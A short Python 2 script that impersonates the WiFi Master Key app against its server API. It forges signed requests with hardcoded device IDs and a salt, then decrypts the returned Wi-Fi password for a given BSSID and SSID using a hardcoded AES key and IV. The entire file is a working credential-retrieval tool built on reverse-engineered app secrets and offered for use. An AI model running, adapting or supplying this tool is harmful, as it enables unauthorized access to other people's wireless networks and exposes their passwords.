#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Author: iswin
#

#安装依赖
#pip install requests
#pip install pycrypto 

from Crypto.Cipher import AES
import base64
import requests
import hashlib
import random
import json
import sys
 
def request(bssid,ssid,salt):
    url='http://wifiapi02.51y5.net/wifiapi/fa.cmd'
    headers={'useg_agent':'WiFiMasterKey/1.1.0 (Mac OS X Version 10.10.3 (Build 14D136))'}
    a='''    data={
			'appid':'0008',
			'bssid':bssid,
			'chanid':'gw',
			'dhid':'ff8080814cc5798a014ccbbdfa375369',
			'ii':'609537f302fc6c32907a935fb4bf7ac9',
			'lang':'cn',
			'mac':'60f81dad28de',
			'method':'getDeepSecChkSwitch',
			'pid':'qryapwd:commonswitch',
			'ssid':ssid,
			'st':'m',
			'uhid':'a0000000000000000000000000000001',
			'v':'324'}
'''
    data={
		'appid':'0008',  #关键1
		'och':'guanwang',
		'bssid':bssid,
		'chanid':'guanwang',
		'dhid':'ff8080814cc5798a014ccbbdfa375369',
		'ii':'609537f302fc6c32907a935fb4bf7ac9',
		'lang':'cn',
		'mac':'60f81dad28de',
		'method':'getDeepSecChkSwitch',
		'pid':'qryapwd:commonswitch',
		'ssid':ssid,
		'st':'m',
		'uhid':'a0000000000000000000000000000001',
		'v':'508'}

    data['sign']=md5(''.join([data[k] for k in sorted(data.keys())]),salt).upper()
    txt=requests.post(url,data, headers=headers).text
    print "return val: ",txt
    return txt 
 
def md5(str,salt):
    m = hashlib.md5()   
    m.update(str+salt)
    return m.hexdigest() 
 
def decrypt(data):
    PADDING = '\0'
    key = 'k%7Ve#8Ie!5Fb&8E'
    iv = 'y!0Oe#2Wj#6Pw!3V'
    recovery = AES.new(key, AES.MODE_CBC, iv).decrypt(str(bytearray.fromhex(data)))
    return recovery.rstrip(PADDING)[3:-13]
 
if __name__ == '__main__':
    if(len(sys.argv)<2):
        print 'python wifi.py bssid ssid\nExample:python wifi.py c8:3a:35:fa:b8:80 Podinns2F03'
        exit()
    try:
        bssid=sys.argv[1]
        ssid=sys.argv[2]
        retSn=json.loads(request(bssid,ssid,md5(str(random.randint(1, 100000)),'')))['retSn']
        response=json.loads(request(bssid,ssid,retSn))
        if int(response['qryapwd']['retCd']) !=0:
            print 'ERROR:'+response['qryapwd']['retMsg']
            exit()
        password=response['qryapwd']['psws'][bssid]['pwd']
        print 'ssid:%s\nbssid:%s\npasswd:%s'%(ssid,bssid,decrypt(password))
    except KeyError:
        print 'ERROR:BSSID('+bssid+') NOT FOUND'





